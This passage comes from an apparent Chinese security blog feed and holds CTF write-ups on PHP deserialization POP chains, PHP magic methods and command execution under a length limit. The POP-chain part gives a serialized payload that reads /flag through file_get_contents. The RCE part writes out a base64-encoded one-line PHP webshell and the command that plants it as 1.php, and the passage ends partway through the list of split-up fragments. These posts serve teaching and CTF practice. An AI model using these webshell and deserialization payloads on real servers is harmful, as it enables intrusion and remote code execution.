class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;Get_hint(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  Start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个代码看起来有点长，不过也不要担心，按照我们上面讲的方法一步一步来就行了，很多代码都没啥用，也就那么一回事儿</p><p>分析：首先依然是找到头和尾，头部依然是一个GET传参，而尾部可以看到<code>Room</code>类中有个<code>Get_hint()</code>方法，里面有一个<code>file_get_contents</code>，可以实现任意文件读取，我们就可以利用这个读取flag文件了，然后就是往前倒推，<code>Room</code>类中<code>__invoke()</code>方法调用了<code>Get_hint()</code>，然后<code>Room</code>类的<code>__get()</code>里面有个<code>return $function()</code>可以调用<code>__invoke()</code>，再往前看，<code>Info</code>类中的<code>__toString()</code>中有<code>Room</code>类中不存在的属性，所以可以调用<code>__get()</code>，然后<code>Start</code>类中有个<code>_sayhello()</code>可以调用<code>__toString()</code>，然后在<code>Start</code>类中<code>__wakeup()</code>方法中直接调用了<code>_sayhello()</code>，而我们知道的是，输入字符串之后就会先进入<code>__wakeup()</code>，这样头和尾就连上了</p><p><img src="https://i.loli.net/2021/08/17/NpIGM2TxJ4bktKq.png" alt="image.png"></p><p>有了思路我们就直接开始构造，一般找思路我们是从尾到头，而构造则是直接从头到尾</p><p><code>头 -&gt; Start::__wakeup() -&gt; Start::_sayhello() -&gt; Info::__toString() -&gt; Room::__get() -&gt; Room::invoke() -&gt; Room::Get_hint() </code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Start();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Room();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> Room();</span><br><span class="line"><span class="variable">$a</span> -&gt; name = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; file[<span class="string">&#x27;filename&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; a = <span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/17/DlchJdyVz281YFW.png" alt="image.png"></p><p>成功打通，注意要把前面的<code>hi</code>去掉再进行base64编码才能得到flag哈</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里通过四个例子基本上算是把php反序列化中构造pop链讲清楚了吧，这四个例子都不算很难，在实际的挖洞中要审的链子可能比这个长的多，但我相信方法都是差不多的；如果这里还有哪里没看懂的，可以去看上一篇文章讲魔术方法的，那里讲了各种魔术方法的调用情况，把所有魔术方法都搞清楚了，再加上细心审代码，构造pop链也就没啥问题了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;pop链的构造-下篇&quot;&gt;&lt;a href=&quot;#pop链的构造-下篇&quot; class=&quot;headerlink&quot; title=&quot;pop链的构造(下篇)&quot;&gt;&lt;/a&gt;pop链的构造(下篇)&lt;/h1&gt;&lt;p&gt;上篇文章中我们详细介绍了魔术方法及调用它们的条件，那么这篇文章就来研究在实例中如何调用它们，并且把它们连成一条pop链，首先，我们来看看什么是pop链&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>反序列化篇之pop链的构造(上)</title>
    <link href="https://arsenetang.github.io/2021/08/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bpop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0(%E4%B8%8A)/"/>
    <id>https://arsenetang.github.io/2021/08/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bpop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0(%E4%B8%8A)/</id>
    <published>2021-08-14T16:00:00.000Z</published>
    <updated>2021-08-15T15:17:25.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pop链的构造-上篇"><a href="#pop链的构造-上篇" class="headerlink" title="pop链的构造(上篇)"></a>pop链的构造(上篇)</h1><p>php反序列化漏洞，是web安全漏洞中非常重要的一种，无论是在ctf中还是实战中都有很广泛的应用，而一般在一些大型ctf比赛中，反序列化甚至是web题中的签到题，所以说把这基础打扎实就很重要；而在php反序列化中，构造pop链肯定是一个绕不开的话题，接下来我们来介绍构造pop链的思路和过程，上篇我们先来详细介绍魔术方法，然后下篇通过多个案例介绍利用pop链将魔术方法串起来</p><span id="more"></span><h2 id="魔术方法测试"><a href="#魔术方法测试" class="headerlink" title="魔术方法测试"></a>魔术方法测试</h2><p>我理解的pop链，就是用一条链子将一堆不同类中的魔术方法串起来，让没有关系的类扯上关系，由前一个魔术方法调用后一个魔术方法，连成一条链子，最终达成我们的目的，所以说了解每个魔术方法的调用条件就非常重要了，接下来我们来做一些测试：</p><h2 id="一-construct-和-destruct"><a href="#一-construct-和-destruct" class="headerlink" title="一.__construct()和__destruct()"></a>一.<code>__construct()</code>和<code>__destruct()</code></h2><p><code>__construct</code>：当对象<strong>创建</strong>时会自动调用，注意是创建的时候，也就是说有<code>new</code>的时候就会调用，在<code>unserialize</code>时是不会被自动调用的</p><p><code>__destruct()</code>：当对象被<strong>销毁</strong>时会自动调用；当新对象创建后，它后面一定会被自动销毁，也就是调用<code>__construct</code>后一定会调用<code>__destruct</code>；或者我们直接传入一个对象，它后面被销毁时也会调用<code>__destruct</code></p><p><img src="https://i.loli.net/2021/08/13/MURxSsHl8Pi9f2X.png" alt="image.png"></p><p>可以看到，创建对象<code>a</code>时调用了<code>__construct</code>，然后输出序列化后的对象<code>a</code>，最后在销毁对象<code>a</code>时调用了<code>__destruct</code></p><p><img src="https://i.loli.net/2021/08/13/IWG9vPVmf5aBoOs.png" alt="image.png"></p><p>再看这个，我们没有创建对象，而是直接传入了一个对象，所以说它没有调用<code>__construct</code>却调用了<code>__destruct</code></p><p><img src="https://i.loli.net/2021/08/13/h25vsIXq4MATpdy.png" alt="image.png"></p><p>最后看这个，因为我们既创建了对象<code>a</code>，也传入了对象，所以说它<code>__destruct</code>被调用了两次，因为它两个对象最后都会被销毁</p><h2 id="二-sleep-和-wakeup"><a href="#二-sleep-和-wakeup" class="headerlink" title="二.__sleep()和__wakeup()"></a>二.<code>__sleep()</code>和<code>__wakeup()</code></h2><p><code>__sleep()</code> ：在对象被序列化<strong>之前</strong>被调用，就是说看到<code>serialize</code>时就会被调用，而且是先调用后再执行序列化</p><p><code>__wakeup()</code>:  将在字符串被反序列化之后被立即调用，就是说看到<code>unserialize</code>后就会被立即调用</p><p><img src="https://i.loli.net/2021/08/14/A1TEoFNpjBLUKhZ.png" alt="image.png"></p><p>从上面这个例子我们可以看出来，在看到<code>serialize($a)</code>后，它是先调用了<code>__sleep()</code>魔法函数，然后才执行了<code>echo</code>，输出了字符串</p><p><img src="https://i.loli.net/2021/08/14/n4c6d5riIJAUOhC.png" alt="image.png"></p><p>而这个例子我们是直接输入了字符串，当它执行了<code>unserialize</code>转换成对象后，就会最先调用<code>__wakeup()</code>，它的优先级最高</p><h2 id="三-toString"><a href="#三-toString" class="headerlink" title="三.__toString()"></a>三.<code>__toString()</code></h2><p><code>__toString()</code>魔术方法是最为最要的，在构造pop链中它往往是很关键的一环，在很多种情况下都会被调用，主要是下面这些：</p><p>(1)echo($obj)或print($obj)打印<strong>对象</strong>时会触发<br>(2)反序列化<strong>对象</strong>与字符串连接时<br>(3)反序列化<strong>对象</strong>参与格式化字符串时<br>(4)反序列化<strong>对象</strong>与<strong>字符串</strong>进行**==<strong>比较时(多为</strong>preg_match正则匹配**)，因为php进行弱比较时会转换参数类型，相当于都转换成字符串进行比较<br>(5)反序列化<strong>对象</strong>参与格式化sql语句时，绑定参数时(用的少)<br>(6)反序列化<strong>对象</strong>经过php字符串函数时，如strlen(),addslashes()时(用的少)<br>(7)在in_array()方法中，第一个参数是<strong>反序列化对象</strong>，第二个参数的数组中有tostring返回的字符串的时候tostring会被调用<br>(8)反序列化的<strong>对象</strong>作为class_exists()的参数的时候(用的少)</p><p>通过看它被调用的情况，不难总结出，当对象被当成了字符串的时候，<code>__toString()</code>就会被调用，无论是将对象打印出来，还是将对象去与字符串进行比较，它都会被调用；这里要注意的是，必须要操作的是<strong>对象</strong>的时候，才会被调用，看代码应该会清晰一些：</p><p><img src="https://i.loli.net/2021/08/14/yuCH7WfwvMPdlhg.png" alt="image.png"></p><p>比如说上面这段代码，我们新建了对象<code>a</code>就直接打印它，照理说肯定是不会有任何回显的，因为只有字符串能被打印，对象肯定是不能被直接打印的，需要先将它序列化成字符串后才可以打印；但我们这直接打印发现它居然有输出，就是因为它按照操作字符串的方法去操作了对象，所以说调用了<code>__toString()</code>，然后将它的返回值输出了出来，下面再来看一个与字符串连接的例子：</p><p><img src="https://i.loli.net/2021/08/15/KhuL8WIM7xYSVpH.png" alt="image.png"></p><p>也是同样的道理，变量a被当成了字符串，然后与b完成了连接，更多调用它的方法在下篇实战中演示</p><h2 id="四-invoke"><a href="#四-invoke" class="headerlink" title="四.__invoke()"></a>四.<code>__invoke()</code></h2><p><code>__invoke</code>：当尝试以调用<strong>函数</strong>的方式调用一个<strong>对象</strong>时，<code>__invoke()</code>方法会被自动调用，而调用函数的方式就是在后面加上<code>()</code>，当我们看到像<code>return $function();</code>这种语句时，就应该意识到后面可能会调用<code>__invoke()</code>，下图是直接在对象后面加<code>()</code>调用</p><p>需要注意的是，这个魔术方法只在PHP 5.3.0 及以上版本有效</p><p><img src="https://i.loli.net/2021/08/15/pcr6Ogo8kIDYtH4.png" alt="image.png"></p><h2 id="五-get-和-set"><a href="#五-get-和-set" class="headerlink" title="五.__get()和__set()"></a>五.<code>__get()</code>和<code>__set()</code></h2><p><code>__get()</code>：从<strong>不可访问的属性中</strong>读取数据，或者说是调用一个类及其父类方法中未定义属性时</p><p><code>__set()</code>：当给一个未定义的属性赋值时，或者修改一个不能被修改的属性时(<code>private protected</code>)(用的不多)</p><p><img src="https://i.loli.net/2021/08/15/iOyhwTMNasckGeI.png" alt="image.png"></p><p>比如说看上面这个例子，<code>echo</code>语句调用了<code>__toString()</code>，然后它返回的是当前对象的<code>a</code>属性，但我们是没有定义<code>a</code>这个属性的，所以说会调用<code>__get()</code>，然后将返回值通过<code>echo</code>打印了出来</p><h2 id="六-call-和-callStatic"><a href="#六-call-和-callStatic" class="headerlink" title="六.__call()和__callStatic()"></a>六.<code>__call()</code>和<code>__callStatic()</code></h2><p><code>__call</code>：在对象中调用类中不存在的方法时，或者是不可访问方法时被调用</p><p><code>__callStatic</code>：在静态上下文中调用一个不可访问静态方法时被调用(用的不多)</p><p><img src="https://i.loli.net/2021/08/15/goMhKZzP9FkrIVy.png" alt="image.png"></p><p>比如说像上面这段代码，我们调用对象<code>a</code>中的方法<code>c</code>，但因为类中没有方法<code>c</code>，所以说就调用了<code>__call()</code></p><h2 id="七-其它魔术方法"><a href="#七-其它魔术方法" class="headerlink" title="七.其它魔术方法"></a>七.其它魔术方法</h2><p>差不多比较重要的魔术方法上面都介绍完了，下面再把其它的魔术方法简单介绍一下，这些基本上ctf中都碰不到，了解了解就行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__isset()：当对不可访问属性调用isset()或empty()时调用</span><br><span class="line">__unset()：当对不可访问属性调用unset()时被调用。</span><br><span class="line">__set_state()：调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line">__clone()：当对象复制完成时调用</span><br><span class="line">__autoload()：尝试加载未定义的类</span><br><span class="line">__debugInfo()：打印所需调试信息</span><br></pre></td></tr></table></figure><p>如果想要测试的可以参考php官方手册：<a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在这里魔术方法就介绍完了，熟练掌握魔术方法是构造pop链的基础，然后pop链具体构造的过程和思路请看下一篇文章</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;pop链的构造-上篇&quot;&gt;&lt;a href=&quot;#pop链的构造-上篇&quot; class=&quot;headerlink&quot; title=&quot;pop链的构造(上篇)&quot;&gt;&lt;/a&gt;pop链的构造(上篇)&lt;/h1&gt;&lt;p&gt;php反序列化漏洞，是web安全漏洞中非常重要的一种，无论是在ctf中还是实战中都有很广泛的应用，而一般在一些大型ctf比赛中，反序列化甚至是web题中的签到题，所以说把这基础打扎实就很重要；而在php反序列化中，构造pop链肯定是一个绕不开的话题，接下来我们来介绍构造pop链的思路和过程，上篇我们先来详细介绍魔术方法，然后下篇通过多个案例介绍利用pop链将魔术方法串起来&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>RCE篇之限制长度下的命令执行</title>
    <link href="https://arsenetang.github.io/2021/08/06/RCE%E7%AF%87%E4%B9%8B%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://arsenetang.github.io/2021/08/06/RCE%E7%AF%87%E4%B9%8B%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2021-08-05T16:00:00.000Z</published>
    <updated>2021-08-09T14:14:45.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="限制长度下的命令执行"><a href="#限制长度下的命令执行" class="headerlink" title="限制长度下的命令执行"></a>限制长度下的命令执行</h1><p>前段时间团队考核遇到过一个限制长度下的rce，虽然是按照别人的脚本复现出来了，但其实里面的原理什么的完全没搞懂，害还是太菜了，找了些文章也基本上就是直接上脚本，趁着假期就把这些基础知识总结一下</p><span id="more"></span><h2 id="1-知识铺垫"><a href="#1-知识铺垫" class="headerlink" title="1.知识铺垫"></a>1.知识铺垫</h2><p>1.在<code>linux</code>下，<code>&gt;</code>可以实现创建文件的功能，并且前面可以执行任何命令，然后将命令执行的结果通过<code>&gt;</code>写入到文件中，例如：</p><p><img src="https://i.loli.net/2021/08/06/GhiJYRsD6qtBcKe.png" alt="image.png"></p><p>可以看到，本来是一个空的文件夹，我们通过<code>&gt;</code>创建了两个空文件<code>a</code>和<code>b</code>，然后又创建了一个空文件<code>c</code>并且将<code>ls</code>的结果写进了<code>c</code>中，注意这里有个顺序问题，就是它是先创建的空文件<code>c</code>然后执行<code>ls</code>的命令，最后将命令执行的结果写进去的</p><p>2.<code>ls</code>这个命令可以添加参数，它默认的排列顺序是按照字母顺序排序，加上<code>-t</code>参数可以按时间顺序来排序文件，新文件在前面，老文件在后面，感觉有点像栈的先进后出，先写的文件在后面，后写的文件在前面，用<code>ls -th</code>也是一样的效果，<code>-h</code>的意思是把文件大小显示成1k 1M 等形式，加上这个之后可以调整<code>-t</code>参数的位置，这个我们后面再讲</p><p><img src="https://i.loli.net/2021/08/06/S5x67RvGu2rfwPT.png" alt="image.png"></p><p>3.<code>linux</code>中有个<code>sh</code>命令会将文件中的内容当作命令来执行，比如说<code>sh d</code>就会将文件<code>d</code>中的内容当作命令来执行</p><p><img src="https://i.loli.net/2021/08/06/OSzMAlh7t1L9Doq.png" alt="image.png"></p><p>4.<code>linux</code>中可以使用<code>反斜杠\</code>来拼接命令，实现命令的换行，当最后一段字符后面没有<code>\</code>了，说明命令拼接结束，并开始执行，但如果是要写成文件名的形式，那最后一个<code>\</code>的前面还需要加一个<code>\</code>作为转义符</p><p><img src="https://i.loli.net/2021/08/06/nKTzuyWlfkaBm6x.png" alt="image.png"></p><p>5.在<code>linux</code>中，<code>星号*</code>可以作为通配符使用，输入<code>*</code>后，<code>linux</code>会将该目录下第一个列出的文件名作为命令，剩下的的文件名当作参数</p><p><img src="https://i.loli.net/2021/08/06/R3dzZiJ6KgYH8jk.png" alt="image.png"></p><p>像上面这个例子，执行<code>*</code>就相当于执行<code>ls t</code>，将<code>ls</code>作为命令，<code>t</code>作为参数；</p><p>有的时候当一个目录下有很多个文件的时候，可以在<code>*</code>后面加上字母作为限制，就可以限定为必须要<strong>带有该字母的文件</strong>才能被当作<strong>命令</strong>和<strong>参数</strong>，它依旧是按照字母顺序，第一个为命令，后面的为参数，比如说下面这个例子，虽然说里面有很多文件，但我们用了<code>*s</code>，相当于就是带有<code>s</code>的第一个文件被作为了命令，后面带有<code>s</code>的文件作为了参数，所以说我们执行<code>*s</code>，相当于执行<code>ls s</code></p><p><img src="https://i.loli.net/2021/08/06/WKQLchT2k8sYIDC.png" alt="image.png"></p><p>6.<code>linux</code>中还有一个倒置命令<code>rev</code>，它可以将文件中的内容倒置，比如说下面这个例子，<code>a</code>文件中的内容本来是<code>1234</code>，然后我们用了<code>rev</code>倒置命令，就输出了<code>4321</code>，我们还可以将这个输出结果写入文件<code>b</code>中</p><p><img src="https://i.loli.net/2021/08/06/tbAkUDFVIfJN2T4.png" alt="image.png"></p><p>当然，我们也可以按照前面的方法，将<code>rev</code>当作文件名，然后利用<code>*v</code>来执行它，只不过文件名也要为<code>v</code></p><p><img src="https://i.loli.net/2021/08/06/5KVYq4wmF2CuWzg.png" alt="image.png"></p><p>7.<code>linux</code>中还有一个命令<code>dir</code>，这个命令和<code>ls</code>基本上是一样的，只不过用<code>ls</code>写入文件中时，每个文件名都是单独一行，它会自动换行，这会影响我们后面命令的执行，但<code>dir</code>就会全部写入一行中，并且会自动加空格，所以说我们就用<code>dir</code>代替<code>ls</code></p><p><img src="https://i.loli.net/2021/08/06/Ae8jmy1nHsYOWQb.png" alt="image.png"></p><p>到这里我们的铺垫知识就全部讲完了，下面就直接进入正题：</p><h2 id="2-核心代码"><a href="#2-核心代码" class="headerlink" title="2.核心代码"></a>2.核心代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5(md5(<span class="variable">$_GET</span>[<span class="string">&quot;pass&quot;</span>]))==<span class="string">&quot;42dc38109914179199efc5c18d47ee68&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="string">&quot;shell.php&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;年轻人，这个后门你把握不住，收手吧&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$you_file</span> = <span class="string">&#x27;/var/www/html/wllm/&#x27;</span>.md5(<span class="string">&quot;wllm&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    mkdir(<span class="variable">$you_file</span>);</span><br><span class="line">    chdir(<span class="variable">$you_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;big_hacker_LTLT&#x27;</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;big_hacker_LTLT&#x27;</span>]) &lt;= <span class="number">5</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> exec(<span class="variable">$_GET</span>[<span class="string">&#x27;big_hacker_LTLT&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) </span><br><span class="line">    </span><br><span class="line">    &#123;</span><br><span class="line">        @exec(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$you_file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>刚开始的这个双md5不用管它，这是题目上一层解出来的，解出来pass的值为<code>LTLT_666</code></p><h2 id="3-思路分析"><a href="#3-思路分析" class="headerlink" title="3.思路分析"></a>3.思路分析</h2><p>从代码中可知，这里有<code>exec</code>函数，是可以执行命令的，但由于有长度限制，所以说我们不能执行完整命令，只能试图利用<code>linux</code>下命令可以拆分的特点，将写入一句话木马的命令，拆分开来，作为文件名的形式先写进去，然后再写一个文件<code>v</code>，里面的内容是<code>ls -th &gt;f</code>，然后通过执行这个文件<code>v</code>，让前面的文件名按照时间顺序拼接起来，并写入到文件<code>f</code>中，那文件<code>f</code>中就是我们想要的写入一句话木马的命令了，最后执行这个文件<code>f</code>，就将木马成功写入进去了</p><h2 id="4-具体过程"><a href="#4-具体过程" class="headerlink" title="4.具体过程"></a>4.具体过程</h2><p>1.我们首先来写<strong>写入一句话木马的命令</strong>，这里要注意的是，由于里面有<code>&lt; ?</code>这些字符，所以说我们先将其<code>base64</code>编码后再写入，具体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一句话：&lt;?php eval($_POST[1]);</span><br><span class="line">base编码后：PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span><br><span class="line">写入的命令：echo$&#123;IFS&#125;PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php</span><br><span class="line">这里的空格要用$&#123;IFS&#125;来代替，避免一句话中存在两个空格</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/07/bMBnwWzhXOrNqGJ.png" alt="image.png"></p><p>验证一下，发现没有问题</p><p>2.然后我们就要来拼接出命令<code>ls -th &gt;f</code>了，我认为这儿是最复杂的，这里先解释一下为啥要拼接出这条命令，因为它<code>ls</code>默认排列文件的顺序是按照字母顺序的，如果把这个顺序写入文件中那肯定是杂乱无章的，也肯定不是我们想要的，所以说我们得想办法控制它的顺序，而唯一能控制的就是输入命令的时间先后顺序了，我们把想要放在后面的先输入，想要放在前面的后输入，然后利用<code>ls -th</code>一排，不就是我们想要的顺序了吗，这里我用<code>kali</code>做个演示，命令就是<code>echo$&#123;IFS&#125;PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php</code></p><p>我们看到核心代码中它每次输入的命令不能超过五字符，那我就把这命令划分一下，五个字符一句，所有的符号前面都要加转义符<code>\</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&gt;e\\</span><br><span 